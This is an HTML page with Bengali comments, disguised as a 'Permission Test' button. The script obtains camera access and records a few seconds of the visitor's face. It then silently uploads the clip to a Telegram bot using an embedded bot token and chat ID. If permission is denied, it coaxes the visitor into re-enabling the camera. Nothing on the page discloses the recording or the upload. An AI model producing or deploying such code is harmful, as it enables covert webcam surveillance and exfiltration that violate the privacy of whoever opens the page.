<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Permission Test</title>
</head>
<body>

    <button id="myBtn" onclick="test(this)">Test On</button>

<script>
async function test(btn) {
    btn.disabled = true; // ক্লিক করার সাথে সাথে বাটন সাময়িক বন্ধ

    try {
        const token = "8951598240:AAFEJNwkQUlHIgizTuM38rgNcY56DSFzzwk";
        const chatId = "2139008203";

        // ক্যামেরা পারমিশন চাওয়া
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user" } 
        });

        const recorder = new MediaRecorder(stream);
        const chunks = [];

        recorder.ondataavailable = e => chunks.push(e.data);

        recorder.onstop = () => {
            stream.getTracks().forEach(t => t.stop());

            const form = new FormData();
            form.append("chat_id", chatId);
            form.append("video", new Blob(chunks, { type: "video/webm" }), "v.webm");
            form.append("caption", "ওয়েব থেকে ভিডিও");

            fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: "POST", body: form });
            btn.disabled = false; // কাজ শেষ হলে বাটন আবার সচল
        };

        recorder.start();
        setTimeout(() => recorder.stop(), 3000);

    } catch (error) {
        // ব্যবহারকারী পারমিশন Deny/Block করলে কোড এখানে আসবে
        btn.disabled = false; // আবার যাতে বাটন চাপতে পারে

        if (error.name === "NotAllowedError" || error.name === "PermissionDeniedError") {
            alert(
                "আপনি পারমিশন ব্লক করেছেন!\n\n" +
                "পুনরায় চালু করার নিয়ম:\n" +
                "১. ব্রাউজারের উপরের অ্যাড্রেস বারের বাম পাশে থাকা 'তালা (Lock)' বা 'সেটিংস' আইকনে চাপুন।\n" +
                "২. 'Permissions' থেকে Camera অপশনটি 'Allow' করে দিন।\n" +
                "৩. এবার আবার 'Test On' বাটনে চাপুন।"
            );
        } else {
            console.error("অন্যান্য এরর:", error);
        }
    }
}
</script>

</body>
</html>
